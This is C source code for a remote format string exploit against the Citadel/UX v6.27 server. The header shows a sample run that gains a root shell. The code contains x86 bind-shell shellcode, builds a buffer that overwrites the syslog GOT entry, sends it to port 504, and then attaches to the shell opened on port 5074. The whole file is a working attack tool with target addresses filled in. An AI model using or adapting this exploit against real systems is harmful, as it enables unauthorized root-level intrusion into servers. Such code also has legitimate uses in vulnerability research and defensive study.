/* citadel_fsexp.c
 *
 * Citadel/UX v6.27 remote format string exploit
 *
 * Use: ./citadel_fsexp -h <host> [options]
 *
 * options:
 *        -h <arg>        host or IP
 *        -t <arg>        type of target system
 *        -l              targets list
 *        -g <arg>        syslog GOT address
 *        -r <arg>        RET address
 *
 * coki@nosystem:~/audit$ ./citadel_fsexp -h localhost -t0
 *
 * Citadel/UX v6.27 remote format string exploit
 * by CoKi <coki@nosystem.com.ar>
 *
 * [*] host                       : localhost
 * [*] system                     : Slackware Linux 10.0
 * [*] syslog GOT address         : 0x0809e9e8
 * [*] RET address                : 0xbfffd5fa
 *
 * [+] verifying host...          OK
 * [+] conecting...               OK
 * [+] building exploit...        OK
 * [+] sending exploit...         OK
 *
 * [+] waiting for shell...
 * [+] connecting to shell...     OK
 *
 * [!] you have a shell :)
 *
 * Linux nosystem 2.4.26 #29 Mon Jun 14 19:22:30 PDT 2004 i686 unknown unknown GNU/Linux
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
 *
 *
 * Tested in Slackware 10.0
 *    
 * by CoKi <coki@nosystem.com.ar>
 * No System Group - http://www.nosystem.com.ar
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <getopt.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define BUFFERSIZE 1024
#define ERROR -1
#define TIMEOUT 3
#define PORT 504
#define SHELL 5074

int connect_timeout(int sfd, struct sockaddr *serv_addr,
  socklen_t addrlen, int timeout);
int check(unsigned long addr);
void use(char *program);
void printlist(void);
void shell(char *host, int port);

char shellcode[] = /* 92 bytes by s0t4ipv6 */
	"\x31\xc0"			// xorl		%eax,%eax
	"\x50"				// pushl	%eax
	"\x40"				// incl		%eax
	"\x89\xc3"			// movl		%eax,%ebx
	"\x50"				// pushl	%eax
	"\x40"				// incl		%eax
	"\x50"				// pushl	%eax
	"\x89\xe1"			// movl		%esp,%ecx
	"\xb0\x66"			// movb		$0x66,%al
	"\xcd\x80"			// int		$0x80
	"\x31\xd2"			// xorl		%edx,%edx
	"\x52"				// pushl	%edx
	"\x66\x68\x13\xd2"		// pushw	$0xd213
	"\x43"				// incl		%ebx
	"\x66\x53"			// pushw	%bx
	"\x89\xe1"			// movl		%esp,%ecx
	"\x6a\x10"			// pushl	$0x10
	"\x51"				// pushl	%ecx
	"\x50"				// pushl	%eax
	"\x89\xe1"			// movl		%esp,%ecx
	"\xb0\x66"			// movb		$0x66,%al
	"\xcd\x80"			// int		$0x80
	"\x40"				// incl		%eax
	"\x89\x44\x24\x04"		// movl		%eax,0x4(%esp,1)
	"\x43"				// incl		%ebx
	"\x43"				// incl		%ebx
	"\xb0\x66"			// movb		$0x66,%al
	"\xcd\x80"			// int		$0x80
	"\x83\xc4\x0c"			// addl		$0xc,%esp
	"\x52"				// pushl	%edx
	"\x52"				// pushl	%edx
	"\x43"				// incl		%ebx
	"\xb0\x66"			// movb		$0x66,%al
	"\xcd\x80"			// int		$0x80
	"\x93"				// xchgl	%eax,%ebx
	"\x89\xd1"			// movl		%edx,%ecx
	"\xb0\x3f"			// movb		$0x3f,%al
	"\xcd\x80"			// int		$0x80
	"\x41"				// incl		%ecx
	"\x80\xf9\x03"			// cmpb		$0x3,%cl
	"\x75\xf6"			// jnz		<shellcode+0x40>
	"\x52"				// pushl	%edx
	"\x68\x6e\x2f\x73\x68"		// pushl	$0x68732f6e
	"\x68\x2f\x2f\x62\x69"		// pushl	$0x69622f2f
	"\x89\xe3"			// movl		%esp,%ebx
	"\x52"				// pushl	%edx
	"\x53"				// pushl	%ebx
	"\x89\xe1"			// movl		%esp,%ecx
	"\xb0\x0b"			// movb		$0xb,%al
	"\xcd\x80"			// int		$0x80
	;

struct {
	char	*os;
	int	got;
	int	ret;
}targets[] =
	{"Slackware Linux 10.0", 0x0809e9e8, 0xbfffd5fa};

int main(int argc, char *argv[]) {
	char buffer[BUFFERSIZE], temp[BUFFERSIZE];
	char opt, *host=NULL, *system=NULL, *p;
	int sockfd, i, retaddr=0, gotaddr=0, targetnum=0;
	unsigned int bal1, bal2, bal3, bal4;
	int cn1, cn2, cn3, cn4;
	struct hostent *he;
	struct sockaddr_in dest_dir;

	printf("\n Citadel/UX v6.27 remote format string exploit\n");
	printf(" by CoKi <coki@nosystem.com.ar>\n\n");

	while ((opt = getopt(argc,argv,"h:g:r:t:l")) != EOF) {
		switch (opt) {
			case 'h':
				host = optarg;
				break;
			case 'g':
				gotaddr = strtoul(optarg,NULL,0);
				break;
			case 'r':
				retaddr = strtoul(optarg,NULL,0);
				break;
			case 't':
				targetnum = atoi(optarg);
				if(targetnum != 0) {
					printf(" invalid target number!\n\n");
					exit(0);
				}
				system = targets[targetnum].os;
				gotaddr = targets[targetnum].got;
				retaddr = targets[targetnum].ret;
				break;
			case 'l':
				printlist();
				break;
			default:
				use(argv[0]);
				break;
		}
	}

	if(host == NULL) use(argv[0]);
	if(gotaddr == 0 || retaddr == 0) use(argv[0]);
	if(system == NULL) system = "unknown";

	printf(" [*] host\t\t\t: %s\n", host);
	printf(" [*] system\t\t\t: %s\n", system);
	printf(" [*] syslog GOT address\t\t: %010p\n", gotaddr);
	printf(" [*] RET address\t\t: %010p\n\n", retaddr);
    
	printf(" [+] verifying host...\t\t");
	fflush(stdout);

	if((he=gethostbyname(host)) == NULL) {
		herror("Error");
		printf("\n");
		exit(1);
	} 
	
	printf("OK\n");

	if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == ERROR) {
		perror("Error");
		printf("\n");
		exit(1);
	}

	dest_dir.sin_family = AF_INET;
	dest_dir.sin_port = htons(PORT);
	dest_dir.sin_addr = *((struct in_addr *)he->h_addr);
	bzero(&(dest_dir.sin_zero), 8);

	printf(" [+] conecting...\t\t");
	fflush(stdout);
	
	if(connect_timeout(sockfd, (struct sockaddr *)&dest_dir,
		sizeof(struct sockaddr), TIMEOUT) == ERROR) {
		
		printf("Closed\n\n");
		exit(1);
	}

	printf("OK\n");
	
	printf(" [+] building evil buffer...\t");
	fflush(stdout);

	bzero(buffer, sizeof(buffer));
	strcat(buffer, "x");

	for(i = 0; i < 4; i++) {
		bzero(temp, sizeof(temp));
		sprintf(temp, "%s", &gotaddr);
		strncat(buffer, temp, 4);
		gotaddr++;
	}

	bal1 = (retaddr & 0xff000000) >> 24;
	bal2 = (retaddr & 0x00ff0000) >> 16;
	bal3 = (retaddr & 0x0000ff00) >>  8;
	bal4 = (retaddr & 0x000000ff);
  
	cn1 = bal4 - 16 - 1 - 15 - 50 - 92;
	cn1 = check(cn1);
	cn2 = bal3 - bal4;
	cn2 = check(cn2);
	cn3 = bal2 - bal3;
	cn3 = check(cn3);
	cn4 = bal1 - bal2;
	cn4 = check(cn4);

	p = buffer;
	p += 17;

	memset(p, '\x90', 50);

	strcat(buffer, shellcode);

	sprintf(temp, "%%%du%%27$n%%%du%%28$n%%%du%%29$n%%%du%%30$n", cn1, cn2, cn3, cn4);
                
	strcat(buffer, temp);
	bzero(temp, sizeof(temp));

	printf("OK\n");

	printf(" [+] sending evil buffer...\t");
	fflush(stdout);
	
	recv(sockfd, temp, sizeof(temp), 0);
	send(sockfd, buffer, strlen(buffer), 0);
	send(sockfd, "\n", 1, 0);
	close(sockfd);
	
	printf("OK\n\n");

	printf(" [+] waiting for shell...\n");
	fflush(stdout);
	sleep(2);

	shell(host, SHELL);
}

int connect_timeout(int sfd, struct sockaddr *serv_addr,
	socklen_t addrlen, int timeout) {

	int res, slen, flags;
	struct timeval tv;
	struct sockaddr_in addr;
	fd_set rdf, wrf;

	fcntl(sfd, F_SETFL, O_NONBLOCK);

	res = connect(sfd, serv_addr, addrlen);

	if (res >= 0) return res;

	FD_ZERO(&rdf);
	FD_ZERO(&wrf);

	FD_SET(sfd, &rdf);
	FD_SET(sfd, &wrf);
	bzero(&tv, sizeof(tv));
	tv.tv_sec = timeout;

	if (select(sfd + 1, &rdf, &wrf, 0, &tv) <= 0)
		return -1;

	if (FD_ISSET(sfd, &wrf) || FD_ISSET(sfd, &rdf)) {
		slen = sizeof(addr);
		if (getpeername(sfd, (struct sockaddr*)&addr, &slen) == -1)
			return -1;

		flags = fcntl(sfd, F_GETFL, NULL);
		fcntl(sfd, F_SETFL, flags & ~O_NONBLOCK);

		return 0;
	}

	return -1;
}

int check(unsigned long addr) {
	char tmp[128];
	snprintf(tmp, sizeof(tmp), "%d", addr);
	if(atoi(tmp) < 1)
		addr = addr + 256;
  
	return addr;
}

void use(char *program) {
	printf(" Use: %s -h <host> [options]\n", program);
	printf("\n options:\n");
	printf("	-h <arg>	host or IP\n");
	printf("	-t <arg>	type of target system\n");
	printf("	-l 		targets list\n");
	printf("	-g <arg>	syslog GOT address\n");
	printf("	-r <arg>	RET address\n\n");
	exit(1);
}

void printlist(void) {
	printf(" targets\n");
	printf(" -------\n\n");
	printf(" [0] %s\n\n", targets[0].os);
	exit(0);
}

void shell(char *host, int port) {
	int sockfd, n;
	char buff[BUFFERSIZE];
	fd_set readfs;
	struct hostent *he;
	struct sockaddr_in dest_dir;

	printf(" [+] connecting to shell...\t");
	fflush(stdout);

	if((he=gethostbyname(host)) == NULL) {
		herror("Error");
		printf("\n");
		exit(1);
	} 

	if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == ERROR) {
		perror("Error");
		printf("\n");
		exit(1);
	}

	dest_dir.sin_family = AF_INET;
	dest_dir.sin_port = htons(port);
	dest_dir.sin_addr = *((struct in_addr *)he->h_addr);
	bzero(&(dest_dir.sin_zero), 8);

	if(connect_timeout(sockfd, (struct sockaddr *)&dest_dir,
		sizeof(struct sockaddr), TIMEOUT) == ERROR) {
		
		printf("Closed\n\n");
		printf(" [-] failed! perhaps the target has down...\n\n");
		exit(1);
	}

	printf("OK\n\n");

	printf(" [!] you have a shell :)\n\n");
	fflush(stdout);

	send(sockfd, "uname -a; id;\n", 14, 0);

	while(1) {
		FD_ZERO(&readfs);
		FD_SET(0, &readfs);
		FD_SET(sockfd, &readfs);
		if(select(sockfd+1, &readfs, NULL, NULL, NULL) < 1) exit(0);
		if(FD_ISSET(0,&readfs)) {
			if((n = read(0,buff,sizeof(buff))) < 1)
			exit(0);
			if(send(sockfd, buff, n, 0) != n) exit(0);
		}
		if(FD_ISSET(sockfd,&readfs)) {
			if((n = recv(sockfd, buff, sizeof(buff), 0)) < 1) exit(0);
			write(1, buff, n);
		}
	}
}

